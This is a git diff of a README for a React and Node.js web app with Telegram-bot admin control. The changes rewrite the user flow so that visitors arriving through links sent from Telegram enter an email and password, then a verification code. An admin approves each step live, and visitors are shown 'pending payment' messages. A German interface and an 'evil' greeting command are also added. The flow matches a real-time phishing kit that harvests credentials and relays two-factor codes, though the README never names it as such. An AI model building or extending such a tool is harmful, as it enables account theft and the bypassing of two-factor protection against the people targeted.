@@ -6,9 +6,10 @@ A React web application where users follow a unique link, complete a series of f
 
 - React frontend with multiple form states
 - Node.js + Express backend
-- Telegram bot integration for admin control
+- Telegram bot integration for admin control and group notifications
 - Real-time updates via WebSockets
 - SQLite database for state persistence
+- German language interface
 
 ## Setup
 
@@ -21,7 +22,9 @@ A React web application where users follow a unique link, complete a series of f
    ```
    TELEGRAM_BOT_TOKEN=your_telegram_bot_token
    ADMIN_CHAT_ID=your_admin_chat_id
+   GROUP_CHAT_ID=your_group_chat_id
    PORT=3000
+   NODE_ENV=development
    ```
 4. Start the development server:
    ```
@@ -38,11 +41,20 @@ A React web application where users follow a unique link, complete a series of f
 ## User Flow
 
 1. User receives a unique URL from Telegram
-2. User completes Form 1 (basic data)
+2. User completes Form 1 (email and password)
 3. Admin approves via Telegram bot
-4. User enters code in Form 2
-5. Admin verifies code via Telegram bot
-6. User sees success or failure message
+4. User selects verification method
+5. User enters verification code
+6. Admin verifies code via Telegram bot
+7. User sees pending payment and success messages
+
+## Telegram Bot Commands
+
+- `/start` - Start the bot and see welcome message
+- `/help` - Show available commands and instructions
+- `/new` - Generate a new session link
+- `/list` - List all active sessions
+- `/hello` - Receive a special "evil" greeting message
 
 ## License
 
